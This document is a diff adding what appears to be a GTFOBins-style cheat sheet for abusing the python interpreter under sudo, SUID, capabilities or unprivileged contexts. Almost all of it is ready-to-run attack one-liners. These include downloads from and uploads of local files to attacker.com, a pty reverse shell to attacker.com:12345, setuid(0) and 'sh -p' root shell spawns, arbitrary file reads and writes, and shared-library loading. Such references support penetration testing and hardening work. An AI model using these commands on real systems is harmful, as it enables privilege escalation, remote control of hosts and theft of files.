@@ -1,0 +1,137 @@
+python
+======
+
+Download
+--------
+
+[Sudo]
+    python -c 'import sys; from os import environ as e
+if sys.version_info.major == 3: import urllib.request as r
+else: import urllib as r
+r.urlretrieve("http://attacker.com/path/to/input-file", "/path/to/output-file")'
+
+[SUID]
+    python -c 'import sys; from os import environ as e
+if sys.version_info.major == 3: import urllib.request as r
+else: import urllib as r
+r.urlretrieve("http://attacker.com/path/to/input-file", "/path/to/output-file")'
+
+[Unprivileged]
+    python -c 'import sys; from os import environ as e
+if sys.version_info.major == 3: import urllib.request as r
+else: import urllib as r
+r.urlretrieve("http://attacker.com/path/to/input-file", "/path/to/output-file")'
+
+File read
+---------
+
+[Sudo]
+    python -c 'print(open("/path/to/input-file").read())'
+
+[SUID]
+    python -c 'print(open("/path/to/input-file").read())'
+
+[Unprivileged]
+    python -c 'print(open("/path/to/input-file").read())'
+
+File write
+----------
+
+[Sudo]
+    python -c 'open("/path/to/output-file","w+").write("DATA")'
+
+[SUID]
+    python -c 'open("/path/to/output-file","w+").write("DATA")'
+
+[Unprivileged]
+    python -c 'open("/path/to/output-file","w+").write("DATA")'
+
+Library load
+------------
+
+[Capabilities]
+    python -c 'from ctypes import cdll; cdll.LoadLibrary("/path/to/lib.so")'
+
+[Sudo]
+    python -c 'from ctypes import cdll; cdll.LoadLibrary("/path/to/lib.so")'
+
+[SUID]
+    python -c 'from ctypes import cdll; cdll.LoadLibrary("/path/to/lib.so")'
+
+[Unprivileged]
+    python -c 'from ctypes import cdll; cdll.LoadLibrary("/path/to/lib.so")'
+
+Reverse shell
+-------------
+
+[Sudo]
+    python -c 'import sys,socket,os,pty;s=socket.socket()
+s.connect(("attacker.com",12345))
+[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
+pty.spawn("/bin/sh")'
+
+[SUID]
+    python -c 'import sys,socket,os,pty;s=socket.socket()
+s.connect(("attacker.com",12345))
+[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
+pty.spawn("/bin/sh")'
+
+[Unprivileged]
+    python -c 'import sys,socket,os,pty;s=socket.socket()
+s.connect(("attacker.com",12345))
+[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
+pty.spawn("/bin/sh")'
+
+Shell
+-----
+
+[Capabilities]
+    python -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'
+
+[Sudo]
+    python -c 'import os; os.execl("/bin/sh", "sh")'
+
+[SUID]
+    python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+
+[Unprivileged]
+    python -c 'import os; os.execl("/bin/sh", "sh")'
+
+Upload
+------
+
+[Sudo]
+    python -c 'import sys
+if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
+else: import urllib as u, urllib2 as r
+r.urlopen("http://attacker.com", open("/path/to/input-file", "rb").read())'
+
+[SUID]
+    python -c 'import sys
+if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
+else: import urllib as u, urllib2 as r
+r.urlopen("http://attacker.com", open("/path/to/input-file", "rb").read())'
+
+[Unprivileged]
+    python -c 'import sys
+if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
+else: import urllib as u, urllib2 as r
+r.urlopen("http://attacker.com", open("/path/to/input-file", "rb").read())'
+
+[Sudo]
+    python -c 'import sys
+if sys.version_info.major == 3: import http.server as s, socketserver as ss
+else: import SimpleHTTPServer as s, SocketServer as ss
+ss.TCPServer(("", 12345), s.SimpleHTTPRequestHandler).serve_forever()'
+
+[SUID]
+    python -c 'import sys
+if sys.version_info.major == 3: import http.server as s, socketserver as ss
+else: import SimpleHTTPServer as s, SocketServer as ss
+ss.TCPServer(("", 12345), s.SimpleHTTPRequestHandler).serve_forever()'
+
+[Unprivileged]
+    python -c 'import sys
+if sys.version_info.major == 3: import http.server as s, socketserver as ss
+else: import SimpleHTTPServer as s, SocketServer as ss
+ss.TCPServer(("", 12345), s.SimpleHTTPRequestHandler).serve_forever()'
